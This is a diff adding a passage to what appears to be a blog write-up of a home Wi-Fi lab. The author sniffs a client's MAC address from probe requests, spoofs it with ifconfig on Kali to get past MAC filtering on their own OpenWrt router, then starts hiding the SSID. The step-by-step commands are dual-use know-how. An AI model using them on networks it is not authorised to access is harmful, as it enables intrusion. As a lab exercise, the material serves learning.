@@ -104,3 +104,39 @@ def processPacket(pkt):
 conf.iface = 'mon0'
 sniff(prn=processPacket)
 {% endhighlight %}
+
+And sure enough:
+
+    INFO:root:Probe request from OpenWrt for 00:26:37:97:9a:7e
+
+So now we have the MAC address for one of the client. Let's change ours:
+
+    root@kali:~# ifconfig wlan0 down
+    root@kali:~# ifconfig wlan0 hw ether 00:26:37:97:9a:7e
+    root@kali:~# ifconfig wlan0 up
+
+And sure enough, we can now connect to the network!
+
+    root@kali:~# ifconfig wlan0
+    wlan0     Link encap:Ethernet  HWaddr 00:26:37:97:9a:7e  
+              inet addr:192.168.1.188  Bcast:192.168.1.255  Mask:255.255.255.0
+
+Beauty is on the router's side there's still only once client connected:
+
+    root@OpenWrt:~# iwinfo wlan0 assoclist
+    00:26:37:97:9A:7E  -65 dBm / -95 dBm (SNR 30)  200 ms ago
+    RX: 58.5 MBit/s, MCS 6, 20MHz                     91 Pkts.
+    TX: 43.3 MBit/s, MCS 4, 20MHz, short GI           43 Pkts.
+
+
+### Level 0x1 ###
+
+Let's step things up a very small notch by hiding the SSID on the router.
+
+    root@OpenWrt:~# uci set wireless.@wifi-iface[0].hidden=1
+    root@OpenWrt:~# uci commit
+    root@OpenWrt:~# uci show wireless
+    ...
+    wireless.@wifi-iface[0].hidden=1
+
+
